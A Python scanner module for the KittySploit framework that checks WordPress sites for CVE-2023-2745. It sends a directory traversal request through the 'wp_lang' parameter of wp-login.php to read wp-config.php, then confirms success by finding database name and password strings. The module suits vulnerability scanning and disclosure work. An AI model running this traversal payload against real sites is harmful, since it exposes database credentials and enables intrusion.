#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Core is vulnerable to Directory Traversal in versions up to, and including, 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Core <=6.2 - Directory Traversal Detection',
        'description': 'WordPress Core is vulnerable to Directory Traversal in versions up to, and including, 6.2, via the ‘wp_lang’ parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'wpscan', 'disclosure', 'wp', 'wordpress', 'lfi', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-2745',
            'https://www.cvedetails.com/cve/CVE-2023-2745/',
        ],
        'cve': 'CVE-2023-2745',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('/wp-content/plugins',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-login.php?wp_lang=../../../../../../../wp-config.php'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='WordPress Core <=6.2 - Directory Traversal detected', path=path)
            return True
        return False

